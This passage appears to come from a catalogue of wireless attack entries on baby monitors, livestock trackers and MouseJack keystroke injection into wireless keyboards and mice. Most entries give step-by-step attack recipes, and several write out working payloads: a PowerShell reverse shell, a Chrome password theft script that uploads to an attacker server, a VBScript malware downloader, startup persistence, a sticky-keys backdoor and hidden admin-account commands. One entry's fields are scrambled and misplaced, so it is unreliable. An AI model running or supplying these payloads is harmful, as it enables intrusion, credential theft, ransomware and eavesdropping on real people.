- **MITRE**: T1420
- **Impact**: Privacy Violation, Espionage
- **Tools**: RTL-SDR, GQRX, Audacity
- **Scenario**: Capturing RF voice data from a baby monitor or intercom to listen in.
- **Attack Steps**: Step 1: Identify brand/model of baby monitor and research default RF band (e.g., 49 MHz or 900 MHz).Step 2: Tune RTL-SDR using GQRX to the band and look for real-time voice activity.Step 3: Wait until the intercom is in use or manually test if you own both units.Step 4: Record the audio signal (AM/FM modulated) using GQRX.Step 5: Save recording and open in Audacity.Step 6: Convert the waveform into audio and play back—verify voice quality.Step 7: Document audio clarity and time windows for optimal interception.Step 8: Simulate eavesdropping scenario in lab, showing importance of encrypted audio transmission.
- **Detection**: RF monitoring or spectrum analysis
- **Solution**: Use DECT/BLE with encryption
- **Tags**: SDR, RF Audio, Eavesdropping

## Reverse Engineering Livestock Tracker RF Protocol

- **Attack Type**: SDR > Proprietary Protocol Reverse Engineering
- **Target**: Livestock Tracker
- **Vulnerability**: No encryption or validation in RF packets
- **MITRE**: T0890
- **Impact**: Misinformation in Agriculture, Livestock Loss
- **Tools**: HackRF, URH, GQRX
- **Scenario**: Decoding RF packets from livestock collars (e.g., cows, sheep) used in farming to track location and status.
- **Attack Steps**: Step 1: Set up HackRF and scan frequency bands around 433 MHz and 915 MHz (common for IoT livestock trackers).Step 2: Observe RF burst from tracker—usually sent every few seconds.Step 3: Record multiple transmissions in GQRX.Step 4: Load into URH and analyze signal strength, packet size, and checksum patterns.Step 5: Decode movement, temperature, or ID from packet structure.Step 6: Simulate signal injection with spoofed location or status (e.g., animal escaped).Step 7: Replay modified signal using HackRF in test environment to monitor system reaction.Step 8: Demonstrate how unencrypted RF affects data integrity in agriculture.
- **Detection**: Unusual logs in livestock software
- **Solution**: Use LoRa with authentication layers
- **Tags**: RF, Farming, SDR, IoT

## MouseJack Attack on Unencrypted Wireless Mouse

- **Attack Type**: Keystroke Injection (MouseJack)
- **Target**: Logitech Wireless Mouse
- **Vulnerability**: Lack of encryption/authentication in wireless dongles
- **MITRE**: T1056.001 (Input Capture - Keylogging)
- **Impact**: Remote Code Execution
- **Tools**: Crazyradio PA, MouseJack Python Scripts
- **Scenario**: Attacker targets a Logitech wireless mouse with a vulnerable USB receiver to inject rogue keystrokes from a distance.
- **Attack Steps**: Step 1: Connect the Crazyradio PA USB dongle to the attacker's laptop.Step 2: Clone the MouseJack GitHub repo (https://github.com/BastilleResearch/mousejack) and install requirements.Step 3: Run scan.py to detect nearby vulnerable wireless mouse receivers.Step 4: Once the target's receiver is detected (e.g., Logitech Unifying Receiver), use inject.py to send payload keystrokes like opening PowerShell.Step 5: Inject commands to download & execute malware or open a malicious site.Step 6: Observe remote code execution without the user realizing.
- **Detection**: USB network monitoring tools, RF signal spectrum analyzer
- **Solution**: Replace vulnerable USB receivers with encrypted models, firmware updates
- **Tags**: mousejack, wireless, HID injection, logitech, RF hacking

## Keystroke Injection into Wireless Keyboard in Conference Room

- **Attack Type**: Keystroke Injection (MouseJack)
- **Target**: Dell Wireless Keyboard
- **Vulnerability**: Lack of encryption in RF keyboard protocols
- **MITRE**: T1059.003 (Command & Scripting Interpreter: Windows Command Shell)
- **Impact**: Disruption, data leak potential
- **Tools**: Crazyradio PA, laptop with Kali Linux
- **Scenario**: An attacker remotely injects keystrokes into a vulnerable wireless keyboard during a public presentation.
- **Attack Steps**: Step 1: Sit within 20 meters of the target (conference room distance).Step 2: Start the MouseJack scanner to find vulnerable keyboards.Step 3: Identify target's unencrypted 2.4GHz signal (often Logitech or Dell devices).Step 4: Use inject_firmware.py to simulate keyboard input.Step 5: Inject harmless but disruptive commands like ALT + F4, CMD + Q, or prank messages to disrupt presentation.Step 6: Use screen recording to capture reaction for security analysis.
- **Detection**: Wireless keyboard traffic capture
- **Solution**: Upgrade to Bluetooth LE keyboards with encryption
- **Tags**: prank, office, public setting, live demo

## MouseJack Exploit for Credential Dump

- **Attack Type**: Keystroke Injection (MouseJack)
- **Target**: Windows PC with Wireless Keyboard
- **Vulnerability**: Unauthenticated HID input
- **MITRE**: T1003.001 (OS Credential Dumping - LSASS Memory)
- **Impact**: Credential Theft
- **Tools**: Crazyradio PA, MouseJack Tools, Mimikatz
- **Scenario**: An attacker injects commands into a vulnerable system via an unencrypted wireless keyboard dongle to dump saved passwords.
- **Attack Steps**: Step 1: Position attacker laptop within 30 feet of the target computer using the wireless keyboard.Step 2: Detect vulnerable USB receiver using scan.py.Step 3: Use inject.py to simulate pressing Windows + R to open the Run window.Step 4: Inject cmd and run it silently (cmd /k) to open a command prompt.Step 5: Inject a series of keystrokes to download and run Mimikatz from the internet using PowerShell.Step 6: Save output to a network share under attacker's control.
- **Detection**: Endpoint behavior monitoring, unexpected PowerShell activity
- **Solution**: Enforce HID whitelisting, physical USB port blocking
- **Tags**: mimikatz, password dump, HID spoofing

## Wireless Mouse Keystroke Injection to Create New Admin User

- **Attack Type**: Keystroke Injection (MouseJack)
- **Target**: Windows 10 PC
- **Vulnerability**: Lack of HID authentication on USB receiver
- **MITRE**: T1136.001 (Create Account - Local Account)
- **Impact**: Privilege Escalation
- **Tools**: Crazyradio PA, MouseJack
- **Scenario**: Attacker silently adds a new administrator user by injecting keystrokes via a vulnerable wireless mouse dongle.
- **Attack Steps**: Step 1: Get within RF range of the target system (~20m).Step 2: Use mousejack-scan.py to detect vulnerable mouse dongles.Step 3: Run inject.py to open a command prompt using Windows + R → cmd.Step 4: Inject net user hacker P@ssw0rd /add and press Enter.Step 5: Inject net localgroup administrators hacker /add to elevate privileges.Step 6: Exit silently.Step 7: Attacker can now log in later with elevated access.
- **Detection**: Check user creation logs, new local accounts
- **Solution**: Replace vulnerable peripherals, GPO restrictions on account creation
- **Tags**: local admin, privilege, mousejack exploit

## MouseJack-Based Ransomware Deployment

- **Attack Type**: Keystroke Injection (MouseJack)
- **Target**: Windows Desktop
- **Vulnerability**: HID device spoofing
- **MITRE**: T1486 (Data Encrypted for Impact)
- **Impact**: Data Loss, Encryption
- **Tools**: Crazyradio PA, MouseJack scripts, Python-based ransomware payload
- **Scenario**: Using MouseJack, an attacker injects commands that silently download and execute a ransomware script.
- **Attack Steps**: Step 1: Ensure Crazyradio PA is set to scan mode and move within RF range.Step 2: Locate victim’s Logitech USB dongle using scan.py.Step 3: Launch inject.py to open cmd using Win + R.Step 4: Inject PowerShell script to download ransomware payload from GitHub (e.g., Invoke-WebRequest or bitsadmin).Step 5: Execute the payload using Start-Process, then clear command history using cls.Step 6: Target system begins encryption silently.Step 7: Victim receives ransom note via fake Notepad or wallpaper change.
- **Detection**: Sudden file renames, high disk activity
- **Solution**: USB dongle replacement, PowerShell restriction, AppLocker
- **Tags**: ransomware, keystroke injection, MouseJack, encryption

## MouseJack Remote Browser Hijack

- **Attack Type**: Keystroke Injection (MouseJack)
- **Target**: Windows PC with Chrome
- **Vulnerability**: Input hijack via HID spoofing
- **MITRE**: T1566.002 (Spearphishing via Service)
- **Impact**: Credential Harvesting
- **Tools**: Crazyradio PA, MouseJack Tools
- **Scenario**: Attacker injects keystrokes to open a browser, redirect to phishing site, and trigger fake login prompt.
- **Attack Steps**: Step 1: Connect Crazyradio PA USB to attacker laptop.Step 2: Clone MouseJack repo and run scan.py to find RF keyboards.Step 3: Once a target is detected, use inject.py to simulate pressing Win + R.Step 4: Type chrome https://fake-login.site and press Enter.Step 5: Browser opens with phishing site, which mimics Office365 or Google login.Step 6: Victim may unknowingly enter credentials.Step 7: Capture entries via keylogger or fake form.
- **Detection**: Proxy logs, Unexpected URL patterns
- **Solution**: Use browser-based allowlists, block USB receivers
- **Tags**: phishing, login spoof, chrome attack

## Exploit of Idle System Using MouseJack

- **Attack Type**: Keystroke Injection (MouseJack)
- **Target**: Public-use Laptop
- **Vulnerability**: Lack of user presence detection, No encryption
- **MITRE**: T1059 (Command and Scripting Interpreter)
- **Impact**: Malware Deployment
- **Tools**: Crazyradio PA, MouseJack
- **Scenario**: System left idle in a public space is compromised using wireless keystroke injection without physical access.
- **Attack Steps**: Step 1: Attacker waits until system is left idle, unlocked (e.g., coffee shop scenario).Step 2: From a few meters away, run scan.py to detect active USB receivers.Step 3: Inject key combo Win + R to open Run dialog.Step 4: Type PowerShell command to disable antivirus and firewall (Set-MpPreference -DisableRealtimeMonitoring $true).Step 5: Download and run malware from attacker-controlled server.Step 6: Exit silently.
- **Detection**: Security tool logs, sudden settings change
- **Solution**: Lock systems when unattended, set idle timeouts
- **Tags**: public attack, idle device, no login

## Mass Keystroke Injection in Open Office Setup

- **Attack Type**: Keystroke Injection (MouseJack)
- **Target**: Multiple Laptops
- **Vulnerability**: Shared USB receiver vulnerabilities
- **MITRE**: T1491.002 (Defacement: Internal Defacement)
- **Impact**: Disruption, possible breach
- **Tools**: Crazyradio PA, Multi-scan MouseJack Script
- **Scenario**: Attacker injects mass disruptive keystrokes across multiple systems using unencrypted USB dongles in a corporate office.
- **Attack Steps**: Step 1: Modify scan.py to scan and log multiple receivers.Step 2: Detect all available Logitech/Dell receivers in RF range.Step 3: Write a script loop to send the same command to all devices (e.g., open Notepad and write profanities or payload downloaders).Step 4: Deploy across systems silently at the same time.Step 5: Watch as users across desks experience keystroke popups.Step 6: Use distraction as a cover for physical intrusion.
- **Detection**: Incident reporting surge, endpoint logs
- **Solution**: Upgrade to encrypted receivers, physical access policies
- **Tags**: multi-target, office, disruption

## MouseJack AutoScript Execution for Persistence

- **Attack Type**: Keystroke Injection (MouseJack)
- **Target**: Windows OS
- **Vulnerability**: HID spoofing via RF
- **MITRE**: T1547.001 (Boot or Logon Autostart Execution)
- **Impact**: Persistence
- **Tools**: Crazyradio PA, MouseJack, Batch Script Payload
- **Scenario**: Attacker injects a persistent script that runs at system startup to maintain access.
- **Attack Steps**: Step 1: Detect nearby vulnerable keyboard dongle.Step 2: Inject command to create a startup.bat file in C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup.Step 3: Inject script with code like curl malicious.exe -o %TEMP%\evil.exe && start %TEMP%\evil.exe.Step 4: File executes on each login.Step 5: Maintain long-term access without redoing injection.
- **Detection**: Startup script file scans, user login behavior
- **Solution**: Limit startup folder writes, script blocking tools
- **Tags**: persistence, batch, auto-run

## Wireless MouseJack Attack on Air-Gapped System

- **Attack Type**: Keystroke Injection (MouseJack)
- **Target**: Offline Computer
- **Vulnerability**: RF-based HID input spoofing
- **MITRE**: T1200 (Hardware Additions)
- **Impact**: Air-gapped compromise
- **Tools**: Crazyradio PA, Payload Executable on USB
- **Scenario**: Even air-gapped systems using vulnerable USB receivers can be targeted from RF proximity to run offline payloads.
- **Attack Steps**: Step 1: Approach air-gapped system with visible wireless peripherals.Step 2: Detect RF receiver using scan.py.Step 3: Plug USB stick into the system prior or via insider help, containing an executable payload (payload.exe).Step 4: Inject keystrokes to run cmd, then navigate to USB (e.g., D:\payload.exe).Step 5: Payload executes without internet, does local logging or file search.Step 6: On next insider visit, USB stick is retrieved.
- **Detection**: Air-gapped device activity, new local files
- **Solution**: RF shielding, disable USB ports when not needed
- **Tags**: air-gapped, insider help, offline

## MouseJack + Rubber Ducky Combined Payload

- **Attack Type**: Keystroke Injection (MouseJack)
- **Target**: Corporate Workstation
- **Vulnerability**: RF + Script Injection
- **MITRE**: T1218.001 (Signed Binary Proxy Execution: Compiled HTML File)
- **Impact**: Full System Compromise
- **Tools**: Crazyradio PA, Pre-built Rubber Ducky Scripts
- **Scenario**: Uses MouseJack to inject keystrokes that trigger scripts similar to USB Rubber Ducky payloads.
- **Attack Steps**: Step 1: Clone Rubber Ducky script library and adapt it to MouseJack’s format.Step 2: Detect vulnerable receiver using scan.py.Step 3: Inject a full encoded script that downloads malicious tools, adds user, modifies firewall.Step 4: Example payload: powershell -w hidden IEX (New-Object Net.WebClient).DownloadString(...).Step 5: System is compromised with multi-stage access.Step 6: Persistence is achieved through script injection.
- **Detection**: Script injection alerts, PowerShell logging
- **Solution**: Restrict unknown script execution, block PowerShell
- **Tags**: rubber ducky, HID spoof, advanced

## MouseJack for USB Dropper Execution

- **Attack Type**: Keystroke Injection (MouseJack)
- **Target**: USB + Wireless Receiver
- **Vulnerability**: No user validation for input
- **MITRE**: T1204.002 (Malicious File)
- **Impact**: Ransomware Deployment
- **Tools**: Crazyradio PA, MouseJack, USB stick with EXE
- **Scenario**: HID injection used to activate pre-planted USB dropper with ransomware.
- **Attack Steps**: Step 1: Drop USB stick with payload in common areas (e.g., reception desk).Step 2: Wait for user to plug it in.Step 3: Once plugged in, detect RF dongle and inject Win + R then D:\run.exe (assuming USB is mounted as D).Step 4: Payload executes immediately.Step 5: Uses local-only encryption ransomware, system is locked.
- **Detection**: File path logs, new executables
- **Solution**: Disable autoplay, restrict USB drive usage
- **Tags**: usb dropper, HID, ransomware

## Social Engineering + MouseJack Combo

- **Attack Type**: Keystroke Injection (MouseJack)
- **Target**: Office PC
- **Vulnerability**: Social + HID Injection
- **MITRE**: T1078 (Valid Accounts)
- **Impact**: Remote Access
- **Tools**: Crazyradio PA, MouseJack
- **Scenario**: Attacker poses as IT support, uses MouseJack to inject key combos in front of user to appear helpful while exploiting system.
- **Attack Steps**: Step 1: Gain physical presence as "IT Support" and casually distract user.Step 2: Behind the scenes, use inject.py to simulate keyboard commands (e.g., adding remote access via RDP).Step 3: Victim thinks you’re just troubleshooting.Step 4: Inject script that creates firewall rule to allow inbound traffic and user account for RDP.Step 5: Leave silently, remote access open.Step 6: Access later at will.
- **Detection**: Firewall config logs, login tracking
- **Solution**: Strong ID verification, 2FA on internal tools
- **Tags**: social engineering, disguise, HID spoof

## MouseJack to Trigger Remote Shell via Browser

- **Attack Type**: Keystroke Injection (MouseJack)
- **Target**: Browser-Enabled System
- **Vulnerability**: No HID whitelisting, poor script restriction
- **MITRE**: T1213.002 (Transmitted Data - Data from Information Repositories)
- **Impact**: Remote Shell, Lateral Movement
- **Tools**: Crazyradio PA, JS Exploit Server
- **Scenario**: HID spoofing used to launch browser that auto-connects to attacker-controlled reverse shell via JS.
- **Attack Steps**: Step 1: Inject keystrokes to open browser and visit attacker.site/shell.html.Step 2: The page runs a JS exploit that uses WebSockets or reverse-shell methods.Step 3: Victim browser connects back to attacker's server.Step 4: Attacker gets remote shell access in browser tab.Step 5: If browser is closed, connection ends; however, persistence script can be planted.
- **Detection**: IDS alerts, JS execution logs
- **Solution**: JS blocking, secure DNS, web filter
- **Tags**: JS shell, browser injection, HID attack

## MouseJack DoS via Endless Input Loop

- **Attack Type**: Keystroke Injection (MouseJack)
- **Target**: Public Laptop
- **Vulnerability**: No rate-limit on input
- **MITRE**: T1499 (Endpoint Denial of Service)
- **Impact**: Input Blocking, Disruption
- **Tools**: Crazyradio PA, MouseJack Infinite Loop Payload
- **Scenario**: Instead of a traditional compromise, attacker spams keyboard input continuously, creating DoS on input system.
- **Attack Steps**: Step 1: Identify a vulnerable USB receiver.Step 2: Craft script that sends endless keystrokes (e.g., "AAAAAA…" every millisecond).Step 3: Inject the script with inject.py in loop mode.Step 4: Target’s system becomes unresponsive to real keyboard input.Step 5: User is forced to unplug receiver or reboot.Step 6: Can be used as denial-of-service or diversion.
- **Detection**: Keyboard buffer overflow logs
- **Solution**: Replace USB receiver, disable untrusted HID
- **Tags**: DOS, prank, input flood

## MouseJack Attack to Create Reverse Shell via PowerShell

- **Attack Type**: Keystroke Injection (MouseJack)
- **Target**: %{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1
- **Vulnerability**: Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"<br>**Step 5:** Use inject.pyto injectWin + R, then launch powershell.exe`, and paste the above payload.Step 6: Reverse shell is now active; attacker gains command-line access.
- **MITRE**: Windows PC with Wireless Receiver
- **Impact**: Lack of encryption/authentication on HID input
- **Tools**: Crazyradio PA, MouseJack Tools, Netcat
- **Scenario**: An attacker uses MouseJack to inject PowerShell commands that establish a reverse shell to a remote server controlled by the attacker.
- **Attack Steps**: Step 1: Set up a Netcat listener on the attacker's machine: nc -lvnp 4444.Step 2: Connect Crazyradio PA to the attacker's laptop and run scan.py to detect the wireless receiver of the target system.Step 3: Confirm the receiver is vulnerable (e.g., Logitech Unifying Receiver).Step 4: Craft a PowerShell command for reverse shell:`powershell -NoP -NonI -W Hidden -Exec Bypass -Command "New-Object System.Net.Sockets.TCPClient('attacker_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535
- **Detection**: T1059.001 (Command & Scripting Interpreter: PowerShell)
- **Solution**: Remote Code Execution
- **Tags**: PowerShell logging, outbound traffic detection

## MouseJack Attack on Locked Windows System

- **Attack Type**: Keystroke Injection (MouseJack)
- **Target**: Locked Windows 10 System
- **Vulnerability**: Keystroke injection at login screen
- **MITRE**: T1546.008 (Accessibility Features)
- **Impact**: Privilege Escalation
- **Tools**: Crazyradio PA, MouseJack Tools, Preloaded Script
- **Scenario**: Exploits the fact that USB HID devices can still send keystrokes even if a system is locked. Attacker injects commands to run as SYSTEM from lock screen using Sticky Keys backdoor.
- **Attack Steps**: Step 1: From 15-20 meters away, identify vulnerable USB receiver via scan.py.Step 2: Confirm system is locked but powered on (login screen visible).Step 3: Inject the following command to enable Sticky Keys backdoor:copy c:\windows\system32\cmd.exe c:\windows\system32\sethc.exeStep 4: Reboot system or wait until user locks it.Step 5: On lock screen, attacker (physically present or via insider help) presses Shift key 5 times, which triggers sethc.exe, opening cmd.exe as SYSTEM.Step 6: From SYSTEM-level shell, create a new admin user:net user attacker P@ss123 /addnet localgroup administrators attacker /addStep 7: Attacker can now log in later with admin access.
- **Detection**: Check if sethc.exe hash changes, Windows Event Logs
- **Solution**: Enable Secure Boot, protect System32 from modification
- **Tags**: sticky keys, SYSTEM, backdoor

## MouseJack Injection to Exfiltrate Browser Passwords

- **Attack Type**: Keystroke Injection (MouseJack)
- **Target**: Laptop with Chrome Browser
- **Vulnerability**: Chrome DBs are readable if not encrypted
- **MITRE**: T1041 (Exfiltration Over C2 Channel)
- **Impact**: Credential Theft
- **Tools**: Crazyradio PA, PowerShell Script, MouseJack Tools
- **Scenario**: Attacker injects PowerShell to export saved passwords from Chrome and send them via HTTP to attacker server.
- **Attack Steps**: Step 1: Attacker prepares a remote PHP endpoint (e.g., attacker.site/upload.php) to receive password data.Step 2: Write a PowerShell script that queries Chrome's password SQLite DB:powershell<br>$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"<br>$copyPath = "$env:TEMP\LoginData.db"<br>Copy-Item $chromePath $copyPath<br>sqlite3 $copyPath "SELECT origin_url, username_value, password_value FROM logins;" > $env:TEMP\creds.txt<br>Invoke-WebRequest -Uri http://attacker.site/upload.php -Method POST -InFile $env:TEMP\creds.txt<br>Step 3: Convert the above script to MouseJack-compatible keystrokes (use duck_to_mousejack.py or manually break lines).Step 4: Inject using inject.py, opening PowerShell and pasting one line at a time.Step 5: Exfiltration completes silently; file appears on attacker's web server.
- **Detection**: Monitor unauthorized file access and POST traffic
- **Solution**: Secure Chrome DBs, restrict script access
- **Tags**: exfiltration, passwords, chrome, RF

## MouseJack Injection of Windows Script Host Dropper

- **Attack Type**: Keystroke Injection (MouseJack)
- **Target**: Windows Laptop
- **Vulnerability**: WSH enabled by default
- **MITRE**: T1059.005 (Command and Scripting Interpreter: Visual Basic)
- **Impact**: Remote Code Execution
- **Tools**: Crazyradio PA, .vbs Payload, MouseJack
- **Scenario**: HID spoofing used to inject VBScript (.vbs) through Windows Script Host that downloads a second-stage payload and executes it.
- **Attack Steps**: Step 1: Prepare a .vbs payload that downloads malware:Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")objXMLHTTP.open "GET", "http://attacker.site/malware.exe", FalseobjXMLHTTP.sendSet objADOStream = CreateObject("ADODB.Stream")objADOStream.OpenobjADOStream.Type = 1objADOStream.Write objXMLHTTP.responseBodyobjADOStream.Position = 0objADOStream.SaveToFile "C:\Temp\malware.exe", 2objADOStream.CloseSet objShell = CreateObject("WScript.Shell")objShell.Run "C:\Temp\malware.exe"Step 2: Save this script on the attacker's system and convert to MouseJack injection format (line-by-line injection).Step 3: Inject Win + R → notepad, paste VBScript, and save as payload.vbs.Step 4: Run wscript payload.vbs via command injection.Step 5: Payload executes and malware is deployed.
- **Detection**: Monitor wscript.exe activity, .vbs file creation
- **Solution**: Disable WSH, use endpoint detection tools
- **Tags**: WSH, VBScript, dropper, HID spoof

## MouseJack for Offline Data Exfiltration via USB

- **Attack Type**: Keystroke Injection (MouseJack)
- **Target**: Offline Workstation
- **Vulnerability**: Unrestricted access to filesystem via HID spoofing
- **MITRE**: T1029 (Scheduled Transfer - Local Exfiltration)
- **Impact**: Data Theft
- **Tools**: Crazyradio PA, MouseJack, USB Flash Drive
- **Scenario**: Attacker injects keystrokes that compress sensitive files and save them to USB drive plugged into target, simulating air-gapped data theft.
- **Attack Steps**: Step 1: Insider plugs USB flash drive into victim system beforehand.Step 2: Attacker nearby detects target receiver with scan.py.Step 3: Inject key combo Win + R and run cmd.Step 4: Inject command: powershell Compress-Archive -Path C:\Users\* -DestinationPath D:\loot.zipStep 5: All user data gets compressed to USB drive.Step 6: Insider retrieves USB later.Step 7: No network activity involved – fully offline exfiltration.
- **Detection**: Large new ZIP files, USB access logs
- **Solution**: Restrict USB write, limit compress tools
- **Tags**: airgap, exfiltration, usb, HID

## Logitech Keyboard Sniffing using KeySniffer

- **Attack Type**: Sniffing Keystrokes via RF
- **Target**: Wireless Keyboard
- **Vulnerability**: Lack of encryption in Logitech Unifying receivers
- **MITRE**: T1056.001 (Input Capture: Keylogging)
- **Impact**: Credential theft, data leakage
- **Tools**: Crazyradio PA, KeySniffer, Laptop with Kali Linux
- **Scenario**: Attacker targets Logitech 2.4GHz keyboard using KeySniffer vulnerability to capture typed data from a distance.
- **Attack Steps**: Step 1: Set up Crazyradio PA dongle on Kali Linux. Step 2: Install and run KeySniffer software. Step 3: Start scanning for unencrypted 2.4GHz signals from wireless keyboards. Step 4: Wait until a Logitech keyboard is detected. Step 5: Begin sniffing keystrokes in real-time and log them into a text file.
- **Detection**: Network monitoring, USB dongle audit
- **Solution**: Replace devices with encrypted models, patch firmware
- **Tags**: RF Sniffing, Unencrypted Keyboard, Crazyradio

## Sniffing Keystrokes from Microsoft Keyboard

- **Attack Type**: Sniffing Keystrokes via RF
- **Target**: Wireless Keyboard
- **Vulnerability**: RF signal not encrypted
- **MITRE**: T1056.001
- **Impact**: Data exposure, password theft
- **Tools**: Crazyradio PA, rfcat, Python script
- **Scenario**: Microsoft 2.4GHz keyboards without AES encryption are targeted for keystroke capture using sniffing tools.
- **Attack Steps**: Step 1: Connect Crazyradio PA dongle to the attacker laptop. Step 2: Install RfCat and required drivers. Step 3: Tune to the known frequency range used by Microsoft keyboards (e.g., 27 MHz or 2.4GHz). Step 4: Run a keystroke logger script that filters captured packets. Step 5: Capture typed data including login credentials.
- **Detection**: RF signal analyzer, audit logs
- **Solution**: Use keyboards with AES-128 encryption, secure physical spaces
- **Tags**: Microsoft, RfCat, RF Tapping

## Replay Attack on Wireless Mouse Clicks

- **Attack Type**: Sniffing Keystrokes via RF
- **Target**: Wireless Mouse
- **Vulnerability**: Unauthenticated click signals
- **MITRE**: T1071.001 (Application Layer Protocol: Web Protocols)
- **Impact**: Triggering malicious actions, file execution
- **Tools**: Crazyradio PA, MouseJack, Python
- **Scenario**: Attacker captures mouse click packets and replays them to cause unintended actions on victim’s machine.
- **Attack Steps**: Step 1: Plug Crazyradio PA into laptop and install MouseJack tools. Step 2: Scan for nearby wireless mice using Python script. Step 3: Capture click packet from target mouse. Step 4: Replay packet repeatedly to simulate mouse clicks. Step 5: Use replayed clicks to open documents or trigger scripts.
- **Detection**: Monitor device inputs, check USB behavior
- **Solution**: Upgrade to devices using encrypted signals
- **Tags**: MouseJack, Replay, Click Injection

## Keystroke Sniffing using RTL-SDR

- **Attack Type**: Sniffing Keystrokes via RF
- **Target**: Wireless Keyboard
- **Vulnerability**: Signal replay, no encryption
- **MITRE**: T1056.001
- **Impact**: Credential theft via radio
- **Tools**: RTL-SDR dongle, GQRX, Inspectrum, Custom decoder
- **Scenario**: RTL-SDR used to sniff 2.4GHz keyboard signals in environments where attackers can't use Crazyradio PA.
- **Attack Steps**: Step 1: Connect RTL-SDR dongle to attacker system. Step 2: Use GQRX to identify active 2.4GHz frequencies. Step 3: Record signal bursts using Inspectrum. Step 4: Analyze bursts to decode raw binary keystrokes. Step 5: Match binary patterns to typed characters using custom scripts.
- **Detection**: Detect spectrum anomalies, physical access logs
- **Solution**: Move to Bluetooth/BLE with encrypted comms
- **Tags**: SDR, Radio Logging, RF Keystroke

## Long-Range Keystroke Capture via Amplified Antenna

- **Attack Type**: Sniffing Keystrokes via RF
- **Target**: Wireless Keyboard
- **Vulnerability**: Weak RF security, extended range attacks
- **MITRE**: T1056.001
- **Impact**: Espionage, surveillance, credential theft
- **Tools**: Crazyradio PA, Yagi antenna, rfcat
- **Scenario**: Using a directional antenna and amplifier, attacker captures keystrokes from ~100 meters away.
- **Attack Steps**: Step 1: Mount Yagi antenna on rooftop/nearby elevated location. Step 2: Connect antenna to Crazyradio PA and to laptop. Step 3: Use rfcat to scan for 2.4GHz devices with weak/no encryption. Step 4: Lock onto keyboard signal and begin sniffing. Step 5: Log all captured keystrokes to a local file.
- **Detection**: RF noise detection tools, antenna tracing
- **Solution**: Physical shielding, frequency-hopping secure keyboards
- **Tags**: Long-Range RF, Directional Antenna, Espionage

## Sniffing Keystrokes Using Universal Receiver Tool

- **Attack Type**: Sniffing Keystrokes via RF
- **Target**: Wireless Keyboard
- **Vulnerability**: No pairing or encryption required
- **MITRE**: T1056.001
- **Impact**: Data theft, espionage
- **Tools**: NRF24L01+, Arduino Nano, Laptop
- **Scenario**: Attacker uses a DIY Universal Wireless Receiver built with NRF24L01+ and Arduino to sniff keystrokes from multiple brands.
- **Attack Steps**: Step 1: Flash the Arduino with Universal Receiver firmware. Step 2: Connect it to laptop via USB and monitor serial output. Step 3: Place the device near the target user (~3-5 meters). Step 4: Observe keystroke packets printed as ASCII. Step 5: Log and analyze captured data in real time.
- **Detection**: Physical inspection, hardware scan
- **Solution**: Use encrypted USB dongles and disable 2.4GHz
- **Tags**: Arduino, NRF, DIY RF Sniffer

## Mobile-Based Keystroke Sniffing Using SDR Dongle

- **Attack Type**: Sniffing Keystrokes via RF
- **Target**: Wireless Keyboard
- **Vulnerability**: Unencrypted RF packets in public
- **MITRE**: T1056.001
- **Impact**: Public-space data theft
- **Tools**: Android phone, OTG cable, SDR dongle, SDRTouch app
- **Scenario**: Attacker uses Android + SDR dongle to sniff keyboard input discreetly in public locations like cafes or airports.
- **Attack Steps**: Step 1: Connect SDR dongle to Android phone using OTG. Step 2: Open SDRTouch app and tune to 2.4GHz band. Step 3: Use built-in waterfall view to find burst signals. Step 4: Record signal data and export it. Step 5: Use offline decoding tool to parse keystrokes from waveforms.
- **Detection**: RF noise detection, phone policy enforcement
- **Solution**: Block unknown RF devices, mobile SDR detection
- **Tags**: Android, SDR, Mobile RF Spy

## Sniffing Keystrokes from Apple Wireless Keyboards (Old Gen)

- **Attack Type**: Sniffing Keystrokes via RF
- **Target**: Wireless Keyboard
- **Vulnerability**: Obsolete RF protocol with no encryption
- **MITRE**: T1056.001
- **Impact**: Legacy system data breach
- **Tools**: RTL-SDR, Inspectrum, Custom decoder
- **Scenario**: Old-generation Apple keyboards (pre-Bluetooth) using proprietary RF susceptible to sniffing using spectrum analysis.
- **Attack Steps**: Step 1: Set up RTL-SDR on Kali Linux. Step 2: Identify Apple RF burst patterns using GQRX. Step 3: Capture long RF samples near a typing user. Step 4: Analyze burst spacing to determine character input. Step 5: Reconstruct typed messages based on pattern library.
- **Detection**: Legacy device audits, spectrum analysis
- **Solution**: Replace obsolete hardware, restrict RF
- **Tags**: Apple RF, Legacy Exploit

## HID Device Emulation and Sniff

- **Attack Type**: Sniffing Keystrokes via RF
- **Target**: Wireless Keyboard
- **Vulnerability**: HID device trust, no auth challenge
- **MITRE**: T1056.001
- **Impact**: Silent data leak
- **Tools**: USB Rubber Ducky, HID injector firmware
- **Scenario**: Attacker emulates HID device to intercept communication mid-session and log ongoing keystrokes.
- **Attack Steps**: Step 1: Prepare USB Rubber Ducky with HID-sniff firmware. Step 2: Plug into victim PC (e.g., during idle moment). Step 3: Intercept keystrokes being typed on RF keyboard. Step 4: Store logged data in internal memory. Step 5: Retrieve device later and exfiltrate logs.
- **Detection**: Audit USB port activity, unauthorized device alarms
- **Solution**: Endpoint security software, whitelist HID
- **Tags**: HID Exploit, USB Ducky

## RF Sniffing via Drone-Mounted Receiver

- **Attack Type**: Sniffing Keystrokes via RF
- **Target**: Wireless Keyboard
- **Vulnerability**: Physical proximity + radio range
- **MITRE**: T1056.001
- **Impact**: Corporate espionage
- **Tools**: Drone, Crazyradio PA, Raspberry Pi
- **Scenario**: A drone flies near windows of a corporate office to sniff unencrypted keyboard transmissions.
- **Attack Steps**: Step 1: Attach Crazyradio PA and Raspberry Pi to a drone. Step 2: Upload scanning scripts to Pi that auto-detect keyboard signals. Step 3: Fly drone near office floors/windows. Step 4: Let Pi log RF packets for 10-15 minutes. Step 5: Land drone and analyze captured keystrokes.
- **Detection**: Monitor for drones, RF scanning
- **Solution**: RF shielding, secure devices
- **Tags**: Drone RF, Flyby Keystroke Logging

## Replay + Injection via MouseJack Toolkit

- **Attack Type**: Sniffing Keystrokes via RF
- **Target**: Wireless Keyboard + Mouse
- **Vulnerability**: Lack of integrity/authentication checks
